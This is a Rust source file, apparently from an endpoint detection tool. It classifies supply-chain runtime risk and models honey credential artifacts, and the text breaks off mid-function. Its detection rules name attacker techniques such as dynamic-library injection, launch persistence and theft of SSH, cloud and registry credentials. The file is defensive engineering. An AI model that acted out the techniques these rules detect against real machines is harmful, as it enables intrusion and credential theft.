//! Endpoint detection, deception, and causal graph primitives.
//!
//! This module is intentionally pure and deterministic. Platform sensors feed
//! observations into it; the logic here classifies supply-chain runtime risk,
//! models safe honey artifacts, and records local causal evidence without
//! depending on a specific EDR transport.

use std::collections::{BTreeMap, BTreeSet, VecDeque};
use std::fs::{self, OpenOptions};
use std::io::{BufRead as _, BufReader, ErrorKind, Read as _, Seek as _, SeekFrom, Write as _};
use std::path::{Component, Path, PathBuf};

use anyhow::{anyhow, Context, Result};
use chrono::{DateTime, Utc};
use hush_core::{
    canonicalize_json, sha256, Hash, Provenance, Receipt, SignedReceipt, Signer, Verdict,
};
use serde::{Deserialize, Serialize};

use crate::event::{
    CommandEventData, CustomEventData, FileEventData, NetworkEventData, PolicyEvent,
    PolicyEventData, PolicyEventType, SecretEventData, ToolEventData,
};

const FNV_OFFSET: u64 = 0xcbf2_9ce4_8422_2325;
const FNV_PRIME: u64 = 0x0000_0100_0000_01b3;
const ENDPOINT_FLIGHT_RECORDER_HISTORY_INDEX_SCHEMA_VERSION: u8 = 10;
const ENDPOINT_FLIGHT_RECORDER_GRAPH_INDEX_SCHEMA_VERSION: u8 = 1;
const ENDPOINT_FLIGHT_RECORDER_GRAPH_EDGE_INDEX_SCHEMA_VERSION: u8 = 1;

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SignatureTrust {
    #[default]
    Unknown,
    Unsigned,
    AdHoc,
    Signed,
    Notarized,
    Invalid,
    Drifted,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct CodeSignatureStatus {
    pub trust: SignatureTrust,
    pub team_id: Option<String>,
    pub signing_id: Option<String>,
    pub cdhash: Option<String>,
    pub expected_cdhash: Option<String>,
    pub notarized: Option<bool>,
}

impl CodeSignatureStatus {
    #[must_use]
    pub fn has_drift(&self) -> bool {
        if matches!(
            self.trust,
            SignatureTrust::Invalid | SignatureTrust::Drifted
        ) {
            return true;
        }

        match (&self.cdhash, &self.expected_cdhash) {
            (Some(actual), Some(expected)) => {
                !actual.trim().is_empty() && !expected.trim().is_empty() && actual != expected
            }
            _ => false,
        }
    }

    #[must_use]
    pub fn is_untrusted_runtime_binary(&self) -> bool {
        matches!(
            self.trust,
            SignatureTrust::Unsigned | SignatureTrust::AdHoc | SignatureTrust::Invalid
        ) || self.notarized == Some(false)
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointProcess {
    pub pid: Option<u32>,
    pub ppid: Option<u32>,
    pub process_guid: Option<String>,
    pub parent_process_guid: Option<String>,
    pub image: Option<String>,
    pub command_line: Option<String>,
    pub cwd: Option<String>,
    pub signing: CodeSignatureStatus,
}

impl EndpointProcess {
    #[must_use]
    pub fn stable_key(&self) -> String {
        self.process_guid
            .as_deref()
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(|value| format!("guid:{value}"))
            .or_else(|| self.pid.map(|pid| format!("pid:{pid}")))
            .or_else(|| {
                self.image
                    .as_deref()
                    .map(str::trim)
                    .filter(|value| !value.is_empty())
                    .map(|image| {
                        let command_line = self.command_line.as_deref().unwrap_or_default();
                        format!("image:{image}:{command_line}")
                    })
            })
            .unwrap_or_else(|| "process:unknown".to_string())
    }

    #[must_use]
    pub fn stable_node_id(&self) -> String {
        let key = self.stable_key();
        stable_id("node", [key.as_str()])
    }
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum EndpointEvent {
    ProcessExec {
        image: String,
        #[serde(default)]
        args: Vec<String>,
        #[serde(default)]
        env: BTreeMap<String, String>,
    },
    FileAccess {
        operation: FileOperation,
        path: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        source_url: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        content_preview: Option<String>,
    },
    NetworkFlow {
        host: String,
        port: u16,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        protocol: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        url: Option<String>,
    },
    DnsLookup {
        query: String,
        #[serde(default, alias = "recordType", skip_serializing_if = "Option::is_none")]
        record_type: Option<String>,
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        answers: Vec<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        resolver: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        status: Option<String>,
    },
    PackageScript {
        manager: PackageManager,
        package: Option<String>,
        phase: String,
        script: String,
        working_directory: Option<String>,
    },
    DylibLoad {
        path: String,
        target_image: Option<String>,
        mechanism: Option<String>,
    },
    LaunchPersistence {
        path: String,
        label: Option<String>,
        operation: FileOperation,
    },
    BrowserExtensionInstall {
        browser: String,
        extension_id: Option<String>,
        path: String,
        source: Option<String>,
    },
    BrowserDownload {
        browser: String,
        path: String,
        source_url: Option<String>,
        #[serde(
            default,
            alias = "contentHash",
            alias = "sha256",
            alias = "fileHash",
            alias = "file_hash",
            alias = "downloadHash",
            alias = "download_hash",
            skip_serializing_if = "Option::is_none"
        )]
        content_hash: Option<String>,
        #[serde(
            default,
            alias = "byteCount",
            alias = "downloadByteCount",
            alias = "download_byte_count",
            alias = "fileSize",
            alias = "file_size",
            alias = "transferSize",
            alias = "transfer_size",
            skip_serializing_if = "Option::is_none"
        )]
        byte_count: Option<u64>,
    },
    CredentialAccess {
        kind: CredentialKind,
        path: Option<String>,
        name: Option<String>,
    },
    ToolCall {
        tool_name: String,
        #[serde(default)]
        parameters: serde_json::Value,
    },
    PolicyDecision {
        action: String,
        target: Option<String>,
        decision: String,
        guard: Option<String>,
        severity: Option<String>,
    },
    Other {
        category: String,
        #[serde(default)]
        fields: BTreeMap<String, serde_json::Value>,
    },
}

impl EndpointEvent {
    #[must_use]
    pub fn kind_name(&self) -> &'static str {
        match self {
            Self::ProcessExec { .. } => "process_exec",
            Self::FileAccess { .. } => "file_access",
            Self::NetworkFlow { .. } => "network_flow",
            Self::DnsLookup { .. } => "dns_lookup",
            Self::PackageScript { .. } => "package_script",
            Self::DylibLoad { .. } => "dylib_load",
            Self::LaunchPersistence { .. } => "launch_persistence",
            Self::BrowserExtensionInstall { .. } => "browser_extension_install",
            Self::BrowserDownload { .. } => "browser_download",
            Self::CredentialAccess { .. } => "credential_access",
            Self::ToolCall { .. } => "tool_call",
            Self::PolicyDecision { .. } => "policy_decision",
            Self::Other { .. } => "other",
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FileOperation {
    Read,
    Write,
    Create,
    Delete,
    Rename,
    Execute,
    Chmod,
    #[default]
    Unknown,
}

impl FileOperation {
    fn from_policy_operation(operation: Option<&str>, event_type: &PolicyEventType) -> Self {
        match operation
            .map(str::trim)
            .map(str::to_ascii_lowercase)
            .as_deref()
        {
            Some("read" | "open" | "file_read") => Self::Read,
            Some("write" | "file_write") => Self::Write,
            Some("create") => Self::Create,
            Some("delete" | "unlink") => Self::Delete,
            Some("rename" | "move") => Self::Rename,
            Some("execute" | "exec") => Self::Execute,
            Some("chmod") => Self::Chmod,
            _ if *event_type == PolicyEventType::FileRead => Self::Read,
            _ if *event_type == PolicyEventType::FileWrite => Self::Write,
            _ => Self::Unknown,
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PackageManager {
    Npm,
    Pnpm,
    Yarn,
    Bun,
    Pip,
    Cargo,
    Brew,
    Go,
    Gem,
    Composer,
    Maven,
    Gradle,
    Uv,
    Poetry,
    Pipenv,
    Dotnet,
    Nuget,
    Swift,
    Mix,
    Other(String),
}

impl PackageManager {
    #[must_use]
    pub fn as_str(&self) -> &str {
        match self {
            Self::Npm => "npm",
            Self::Pnpm => "pnpm",
            Self::Yarn => "yarn",
            Self::Bun => "bun",
            Self::Pip => "pip",
            Self::Cargo => "cargo",
            Self::Brew => "brew",
            Self::Go => "go",
            Self::Gem => "gem",
            Self::Composer => "composer",
            Self::Maven => "maven",
            Self::Gradle => "gradle",
            Self::Uv => "uv",
            Self::Poetry => "poetry",
            Self::Pipenv => "pipenv",
            Self::Dotnet => "dotnet",
            Self::Nuget => "nuget",
            Self::Swift => "swift",
            Self::Mix => "mix",
            Self::Other(value) => value.as_str(),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CredentialKind {
    SshKey,
    ApiToken,
    CloudCredential,
    PackageRegistryToken,
    BrowserCookie,
    SigningKey,
    Other(String),
}

impl CredentialKind {
    #[must_use]
    pub fn as_str(&self) -> &str {
        match self {
            Self::SshKey => "ssh_key",
            Self::ApiToken => "api_token",
            Self::CloudCredential => "cloud_credential",
            Self::PackageRegistryToken => "package_registry_token",
            Self::BrowserCookie => "browser_cookie",
            Self::SigningKey => "signing_key",
            Self::Other(value) => value.as_str(),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointObservation {
    pub observation_id: String,
    pub timestamp: DateTime<Utc>,
    pub host_id: Option<String>,
    pub user_id: Option<String>,
    pub session_id: Option<String>,
    pub process: EndpointProcess,
    pub event: EndpointEvent,
    pub metadata: BTreeMap<String, serde_json::Value>,
}

impl Default for EndpointObservation {
    fn default() -> Self {
        Self {
            observation_id: stable_id("obs", ["default"]),
            timestamp: Utc::now(),
            host_id: None,
            user_id: None,
            session_id: None,
            process: EndpointProcess::default(),
            event: EndpointEvent::Other {
                category: "unknown".to_string(),
                fields: BTreeMap::new(),
            },
            metadata: BTreeMap::new(),
        }
    }
}

impl EndpointObservation {
    #[must_use]
    pub fn event_name(&self) -> &'static str {
        self.event.kind_name()
    }

    #[must_use]
    pub fn from_policy_event(event: &PolicyEvent) -> Self {
        let metadata = metadata_as_btree(event.metadata.as_ref(), event.context.as_ref());
        let process = process_from_metadata(&metadata);
        Self {
            observation_id: event.event_id.clone(),
            timestamp: event.timestamp,
            host_id: string_field(
                &metadata,
                &[
                    "hostId",
                    "host_id",
                    "endpointHostId",
                    "endpoint_host_id",
                    "endpointId",
                    "endpoint_id",
                ],
            ),
            user_id: string_field(
                &metadata,
                &[
                    "userId",
                    "user_id",
                    "principal",
                    "principalId",
                    "principal_id",
                ],
            ),
            session_id: event
                .session_id
                .clone()
                .or_else(|| string_field(&metadata, &["sessionId", "session_id"])),
            process,
            event: endpoint_event_from_policy_event(event),
            metadata,
        }
    }

    #[must_use]
    pub fn to_policy_event_projection(&self) -> PolicyEvent {
        let metadata = policy_event_metadata_from_observation(self);
        match &self.event {
            EndpointEvent::FileAccess {
                operation,
                path,
                content_preview,
                ..
            } => {
                let Some((event_type, operation_name)) = policy_event_file_operation(operation)
                else {
                    return custom_policy_event_from_observation(self, "endpoint.file_access");
                };
                PolicyEvent {
                    event_id: self.observation_id.clone(),
                    event_type,
                    timestamp: self.timestamp,
                    session_id: self.session_id.clone(),
                    data: PolicyEventData::File(FileEventData {
                        path: path.clone(),
                        operation: Some(operation_name.to_string()),
                        content_base64: None,
                        content: content_preview.clone(),
                        content_hash: None,
                    }),
                    metadata,
                    context: None,
                }
            }
            EndpointEvent::NetworkFlow {
                host,
                port,
                protocol,
                url,
            } => PolicyEvent {
                event_id: self.observation_id.clone(),
                event_type: PolicyEventType::NetworkEgress,
                timestamp: self.timestamp,
                session_id: self.session_id.clone(),
                data: PolicyEventData::Network(NetworkEventData {
                    host: host.clone(),
                    port: *port,
                    protocol: protocol.clone(),
                    url: url.clone(),
                }),
                metadata,
                context: None,
            },
            EndpointEvent::DnsLookup { .. } => {
                custom_policy_event_from_observation(self, "endpoint.dns_lookup")
            }
            EndpointEvent::ProcessExec { image, args, .. } => PolicyEvent {
                event_id: self.observation_id.clone(),
                event_type: PolicyEventType::CommandExec,
                timestamp: self.timestamp,
                session_id: self.session_id.clone(),
                data: PolicyEventData::Command(CommandEventData {
                    command: image.clone(),
                    args: args.clone(),
                }),
                metadata,
                context: None,
            },
            EndpointEvent::ToolCall {
                tool_name,
                parameters,
            } => PolicyEvent {
                event_id: self.observation_id.clone(),
                event_type: PolicyEventType::ToolCall,
                timestamp: self.timestamp,
                session_id: self.session_id.clone(),
                data: PolicyEventData::Tool(ToolEventData {
                    tool_name: tool_name.clone(),
                    parameters: parameters.clone(),
                }),
                metadata,
                context: None,
            },
            EndpointEvent::CredentialAccess { kind, path, name } => PolicyEvent {
                event_id: self.observation_id.clone(),
                event_type: PolicyEventType::SecretAccess,
                timestamp: self.timestamp,
                session_id: self.session_id.clone(),
                data: PolicyEventData::Secret(SecretEventData {
                    secret_name: name
                        .clone()
                        .or_else(|| path.clone())
                        .unwrap_or_else(|| kind.as_str().to_string()),
                    scope: kind.as_str().to_string(),
                }),
                metadata,
                context: None,
            },
            EndpointEvent::Other { category, fields } => {
                let mut extra = serde_json::Map::new();
                for (key, value) in fields {
                    extra.insert(key.clone(), value.clone());
                }
                extra.insert(
                    "endpointEventKind".to_string(),
                    serde_json::Value::String(self.event_name().to_string()),
                );
                PolicyEvent {
                    event_id: self.observation_id.clone(),
                    event_type: PolicyEventType::Custom,
                    timestamp: self.timestamp,
                    session_id: self.session_id.clone(),
                    data: PolicyEventData::Custom(CustomEventData {
                        custom_type: category.clone(),
                        extra,
                    }),
                    metadata,
                    context: None,
                }
            }
            EndpointEvent::PackageScript { .. } => {
                custom_policy_event_from_observation(self, "endpoint.package_script")
            }
            EndpointEvent::DylibLoad { .. } => {
                custom_policy_event_from_observation(self, "endpoint.dylib_load")
            }
            EndpointEvent::LaunchPersistence { .. } => {
                custom_policy_event_from_observation(self, "endpoint.launch_persistence")
            }
            EndpointEvent::BrowserExtensionInstall { .. } => {
                custom_policy_event_from_observation(self, "endpoint.browser_extension_install")
            }
            EndpointEvent::BrowserDownload { .. } => {
                custom_policy_event_from_observation(self, "endpoint.browser_download")
            }
            EndpointEvent::PolicyDecision { .. } => {
                custom_policy_event_from_observation(self, "endpoint.policy_decision")
            }
        }
    }
}

fn policy_event_file_operation(
    operation: &FileOperation,
) -> Option<(PolicyEventType, &'static str)> {
    match operation {
        FileOperation::Read => Some((PolicyEventType::FileRead, "read")),
        FileOperation::Write => Some((PolicyEventType::FileWrite, "write")),
        FileOperation::Create => Some((PolicyEventType::FileWrite, "create")),
        FileOperation::Delete => Some((PolicyEventType::FileWrite, "delete")),
        FileOperation::Rename => Some((PolicyEventType::FileWrite, "rename")),
        FileOperation::Chmod => Some((PolicyEventType::FileWrite, "chmod")),
        FileOperation::Execute | FileOperation::Unknown => None,
    }
}

fn policy_event_metadata_from_observation(
    observation: &EndpointObservation,
) -> Option<serde_json::Value> {
    let mut metadata = serde_json::Map::new();
    for (key, value) in &observation.metadata {
        metadata.insert(key.clone(), value.clone());
    }
    if let Some(host_id) = observation.host_id.as_ref() {
        metadata
            .entry("hostId".to_string())
            .or_insert_with(|| serde_json::Value::String(host_id.clone()));
    }
    if let Some(user_id) = observation.user_id.as_ref() {
        metadata
            .entry("userId".to_string())
            .or_insert_with(|| serde_json::Value::String(user_id.clone()));
    }
    if let Ok(process) = serde_json::to_value(&observation.process) {
        metadata.entry("process".to_string()).or_insert(process);
    }
    metadata.insert(
        "endpointObservationId".to_string(),
        serde_json::Value::String(observation.observation_id.clone()),
    );
    metadata.insert(
        "endpointEventKind".to_string(),
        serde_json::Value::String(observation.event_name().to_string()),
    );

    if metadata.is_empty() {
        None
    } else {
        Some(serde_json::Value::Object(metadata))
    }
}

fn custom_policy_event_from_observation(
    observation: &EndpointObservation,
    custom_type: &str,
) -> PolicyEvent {
    let mut extra = serde_json::Map::new();
    extra.insert(
        "endpointEventKind".to_string(),
        serde_json::Value::String(observation.event_name().to_string()),
    );
    extra.insert(
        "endpointEvent".to_string(),
        serde_json::to_value(&observation.event).unwrap_or(serde_json::Value::Null),
    );

    PolicyEvent {
        event_id: observation.observation_id.clone(),
        event_type: PolicyEventType::Custom,
        timestamp: observation.timestamp,
        session_id: observation.session_id.clone(),
        data: PolicyEventData::Custom(CustomEventData {
            custom_type: custom_type.to_string(),
            extra,
        }),
        metadata: policy_event_metadata_from_observation(observation),
        context: None,
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DetectionSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DetectionEvidence {
    pub key: String,
    pub value: String,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct DetectionFinding {
    pub finding_id: String,
    pub rule_id: String,
    pub title: String,
    pub severity: DetectionSeverity,
    pub confidence: f32,
    pub description: String,
    pub observation_id: String,
    pub timestamp: DateTime<Utc>,
    pub evidence: Vec<DetectionEvidence>,
    pub mitre_attack: Vec<String>,
    pub tags: Vec<String>,
    pub remediation: String,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct SupplyChainRuntimeGuard {
    pub honey_artifacts: Vec<HoneyArtifact>,
}

impl SupplyChainRuntimeGuard {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    #[must_use]
    pub fn with_honey_artifacts(honey_artifacts: Vec<HoneyArtifact>) -> Self {
        Self { honey_artifacts }
    }

    #[must_use]
    pub fn evaluate(&self, observation: &EndpointObservation) -> Vec<DetectionFinding> {
        let mut findings = Vec::new();
        self.detect_supply_chain_behaviors(observation, &mut findings);
        self.detect_honey_access(observation, &mut findings);
        findings
    }

    fn detect_supply_chain_behaviors(
        &self,
        observation: &EndpointObservation,
        findings: &mut Vec<DetectionFinding>,
    ) {
        match &observation.event {
            EndpointEvent::PackageScript {
                manager,
                phase,
                script,
                package,
                working_directory,
            } => {
                let phase_risky = is_install_phase(phase);
                let script_risky = suspicious_script_reason(script);
                if phase_risky || script_risky.is_some() {
                    let mut evidence = vec![
                        ev("manager", manager.as_str()),
                        ev("phase", phase),
                        ev("script", script),
                    ];
                    if let Some(package) = package {
                        evidence.push(ev("package", package));
                    }
                    if let Some(working_directory) = working_directory {
                        evidence.push(ev("workingDirectory", working_directory));
                    }
                    if let Some(reason) = script_risky {
                        evidence.push(ev("scriptRisk", reason));
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.install_script.risky",
                            title: "Package install script executed risky behavior",
                            severity: DetectionSeverity::High,
                            confidence: 0.86,
                            description: "A package manager lifecycle script attempted behavior commonly used by supply-chain malware.",
                            mitre_attack: vec!["T1195.002", "T1059"],
                            tags: vec!["supply_chain", "package_manager", manager.as_str()],
                            remediation: "Quarantine the package install directory, preserve the lockfile and script body, and replay the install in an isolated sandbox before allowing it again.",
                        },
                    ));
                }
            }
            EndpointEvent::ProcessExec { image, args, env } => {
                if observation.process.signing.is_untrusted_runtime_binary()
                    && path_is_user_writable_or_download(image)
                {
                    findings.push(finding(
                        observation,
                        vec![
                            ev("image", image),
                            ev(
                                "signatureTrust",
                                format!("{:?}", observation.process.signing.trust),
                            ),
                        ],
                        FindingRule {
                            rule_id: "supply_chain.unsigned_binary.dev_path",
                            title: "Unsigned or unnotarized binary executed from writable path",
                            severity: DetectionSeverity::High,
                            confidence: 0.82,
                            description: "A runtime binary without trusted signing executed from a user-writable or download/cache location.",
                            mitre_attack: vec!["T1204", "T1036"],
                            tags: vec!["supply_chain", "unsigned_binary"],
                            remediation: "Block or quarantine the binary until its source, notarization, and expected hash are verified.",
                        },
                    ));
                }

                if observation.process.signing.has_drift() {
                    let mut evidence = vec![ev("image", image)];
                    if let Some(evidence_item) =
                        opt_ev("cdhash", observation.process.signing.cdhash.as_deref())
                    {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev(
                        "expectedCdhash",
                        observation.process.signing.expected_cdhash.as_deref(),
                    ) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.signature_drift",
                            title: "Code signature or notarization drift detected",
                            severity: DetectionSeverity::Critical,
                            confidence: 0.9,
                            description: "The observed binary signature does not match the expected code directory hash or trust state.",
                            mitre_attack: vec!["T1553.001", "T1036"],
                            tags: vec!["supply_chain", "signature_drift"],
                            remediation: "Stop the process tree, preserve the binary, and compare the artifact against the release manifest before re-enabling it.",
                        },
                    ));
                }

                if command_looks_like_package_manager(image, args)
                    && env
                        .keys()
                        .any(|key| key.eq_ignore_ascii_case("DYLD_INSERT_LIBRARIES"))
                {
                    findings.push(finding(
                        observation,
                        vec![ev("image", image), ev("args", args.join(" "))],
                        FindingRule {
                            rule_id: "supply_chain.package_manager_dylib_injection",
                            title: "Package manager launched with dynamic library injection",
                            severity: DetectionSeverity::Critical,
                            confidence: 0.91,
                            description: "A package manager or developer tool executed with dynamic library injection enabled.",
                            mitre_attack: vec!["T1574.006", "T1195.002"],
                            tags: vec!["supply_chain", "dylib_injection"],
                            remediation: "Terminate the process tree and inspect shell startup files, launch agents, and package scripts for the injection source.",
                        },
                    ));
                }

                if let Some(package_manager) = package_registry_cli_name(image, args) {
                    if let Some(reason) = suspicious_package_registry_cli_reason(args) {
                        let mut evidence = vec![
                            ev("packageManager", package_manager),
                            ev("image", image),
                            ev("args", args.join(" ")),
                            ev("packageRegistryRisk", reason),
                        ];
                        let credential_keys = package_registry_credential_env_keys(env);
                        if !credential_keys.is_empty() {
                            evidence.push(ev("credentialEnvKeys", credential_keys.join(",")));
                        }
                        findings.push(finding(
                            observation,
                            evidence,
                            FindingRule {
                                rule_id: "supply_chain.package_registry_token_operation",
                                title: "Package manager executed registry token operation",
                                severity: DetectionSeverity::High,
                                confidence: 0.84,
                                description: "A package manager listed, created, revoked, read, or wrote package-registry authentication token material.",
                                mitre_attack: vec!["T1552", "T1528", "T1195.002"],
                                tags: vec![
                                    "supply_chain",
                                    "package_manager",
                                    "package_registry_token",
                                ],
                                remediation: "Inspect the invoking tool/session, rotate package-registry tokens when unexpected, and replay the workflow before staging a blocking rule.",
                            },
                        ));
                    }
                }

                if let Some(cli_name) = cloud_cli_name(image, args) {
                    if let Some(reason) = suspicious_cloud_cli_reason(args) {
                        let mut evidence = vec![
                            ev("cloudCli", cli_name),
                            ev("image", image),
                            ev("args", args.join(" ")),
                            ev("cloudCliRisk", reason),
                        ];
                        let credential_keys = cloud_credential_env_keys(env);
                        if !credential_keys.is_empty() {
                            evidence.push(ev("credentialEnvKeys", credential_keys.join(",")));
                        }
                        findings.push(finding(
                            observation,
                            evidence,
                            FindingRule {
                                rule_id: "supply_chain.cloud_cli_sensitive_operation",
                                title: "Cloud CLI executed credential or secret operation",
                                severity: DetectionSeverity::High,
                                confidence: 0.83,
                                description: "A cloud provider CLI performed a credential, token, IAM, key, or secret retrieval operation from the endpoint.",
                                mitre_attack: vec!["T1552", "T1528", "T1098"],
                                tags: vec!["supply_chain", "cloud_cli", "developer_workstation"],
                                remediation: "Inspect the causal graph for the invoking tool or agent, rotate exposed cloud credentials when unexpected, and stage a policy rule before blocking routine developer workflows.",
                            },
                        ));
                    }
                }
            }
            EndpointEvent::DylibLoad {
                path,
                mechanism,
                target_image,
            } => {
                let mechanism_risky = mechanism
                    .as_deref()
                    .map(|value| value.eq_ignore_ascii_case("DYLD_INSERT_LIBRARIES"))
                    .unwrap_or(false);
                if mechanism_risky || path_is_user_writable_or_download(path) {
                    let mut evidence = vec![ev("dylibPath", path)];
                    if let Some(evidence_item) = opt_ev("targetImage", target_image.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev("mechanism", mechanism.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.dylib_injection",
                            title: "Dynamic library injection into developer/runtime process",
                            severity: DetectionSeverity::Critical,
                            confidence: 0.88,
                            description: "A dynamic library loaded through an injection path or from a writable location.",
                            mitre_attack: vec!["T1574.006"],
                            tags: vec!["supply_chain", "dylib_injection"],
                            remediation: "Capture the target process tree, library file, and environment before terminating or isolating the process.",
                        },
                    ));
                }
            }
            EndpointEvent::LaunchPersistence {
                path,
                label,
                operation,
            } => {
                if path_is_launch_persistence(path) {
                    let mut evidence =
                        vec![ev("path", path), ev("operation", format!("{operation:?}"))];
                    if let Some(evidence_item) = opt_ev("label", label.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.launch_persistence",
                            title: "LaunchAgent or LaunchDaemon persistence changed",
                            severity: DetectionSeverity::High,
                            confidence: 0.84,
                            description: "A launch persistence location was created or modified during endpoint activity.",
                            mitre_attack: vec!["T1543.001"],
                            tags: vec!["persistence", "supply_chain"],
                            remediation: "Disable the launch item, preserve the plist, and trace the writing process back to its package or tool origin.",
                        },
                    ));
                }
            }
            EndpointEvent::BrowserExtensionInstall {
                browser,
                extension_id,
                path,
                source,
            } => {
                let unmanaged = source
                    .as_deref()
                    .map(|value| !value.eq_ignore_ascii_case("managed"))
                    .unwrap_or(true);
                if unmanaged && path_looks_like_browser_extension(path) {
                    let mut evidence = vec![ev("browser", browser), ev("path", path)];
                    if let Some(evidence_item) = opt_ev("extensionId", extension_id.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev("source", source.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.unmanaged_browser_extension",
                            title: "Unmanaged browser extension installed or modified",
                            severity: DetectionSeverity::Medium,
                            confidence: 0.78,
                            description: "A browser extension changed outside an explicitly managed deployment channel.",
                            mitre_attack: vec!["T1176"],
                            tags: vec!["browser_extension", "supply_chain"],
                            remediation: "Disable the extension, preserve its manifest, and verify its source and permissions before allowing it.",
                        },
                    ));
                }
            }
            EndpointEvent::CredentialAccess { kind, path, name } => {
                let path_risky = path
                    .as_deref()
                    .map(path_looks_like_developer_secret)
                    .unwrap_or(false);
                if path_risky || credential_kind_is_developer_secret(kind) {
                    let mut evidence = vec![ev("credentialKind", kind.as_str())];
                    if let Some(evidence_item) = opt_ev("path", path.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev("name", name.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.developer_secret_access",
                            title: "Developer credential material accessed",
                            severity: DetectionSeverity::High,
                            confidence: 0.8,
                            description: "A process accessed package, cloud, SSH, browser, or signing credential material.",
                            mitre_attack: vec!["T1552.001", "T1555"],
                            tags: vec!["credential_access", "supply_chain"],
                            remediation: "Rotate the touched credential if access was not expected and inspect the causal graph for follow-on network egress.",
                        },
                    ));
                }
            }
            _ => {}
        }
    }

    fn detect_honey_access(
        &self,
        observation: &EndpointObservation,
        findings: &mut Vec<DetectionFinding>,
    ) {
        for artifact in &self.honey_artifacts {
            if let Some(evidence) = honey_artifact_match_evidence(artifact, observation) {
                findings.push(finding(
                    observation,
                    evidence,
                    FindingRule {
                        rule_id: "deception.honey_artifact_touched",
                        title: "Honey artifact was touched",
                        severity: DetectionSeverity::Critical,
                        confidence: 0.97,
                        description: "A planted deception artifact was accessed. This is a high-confidence endpoint compromise or misuse signal.",
                        mitre_attack: vec!["T1552.001", "T1005"],
                        tags: vec!["deception", "honey_artifact", artifact.kind.as_str()],
                        remediation: "Immediately preserve the process tree, isolate network egress for the actor, and rotate any real credentials adjacent to the honey artifact.",
                    },
                ));
            }
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HoneyArtifactKind {
    SshPrivateKey,
    ApiTokenFile,
    CloudCredentials,
    PackageRegistryToken,
    BrowserCookieJar,
    InternalHostname,
}

impl HoneyArtifactKind {
    #[must_use]
    pub fn as_str(&self) -> &str {
        match self {
            Self::SshPrivateKey => "ssh_private_key",
            Self::ApiTokenFile => "api_token_file",
            Self::CloudCredentials => "cloud_credentials",
            Self::PackageRegistryToken => "package_registry_token",
            Self::BrowserCookieJar => "browser_cookie_jar",
            Self::InternalHostname => "internal_hostname",
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct HoneyArtifact {
    pub artifact_id: String,
    pub kind: HoneyArtifactKind,
    pub relative_path: PathBuf,
    pub marker: String,
    pub contents: String,
    pub permissions_octal: u32,
    pub tags: Vec<String>,
}

impl HoneyArtifact {
    #[must_use]
    pub fn absolute_path(&self, root: &Path) -> PathBuf {
        root.join(&self.relative_path)
    }

    #[must_use]
    pub fn matches_path(&self, path: &str) -> bool {
        let observed = normalize_path_string(path);
        let relative = normalize_path_string(&self.relative_path.display().to_string());
        observed == relative || observed.ends_with(&format!("/{relative}"))
    }

    #[must_use]
    pub fn internal_hostname(&self) -> Option<&str> {
        if self.kind != HoneyArtifactKind::InternalHostname {
            return None;
        }
        self.contents
            .lines()
            .flat_map(str::split_whitespace)
            .find(|token| token.contains('.') && !token.starts_with('#'))
    }

    #[must_use]
    pub fn matches_network_destination(&self, host: &str, url: Option<&str>) -> bool {
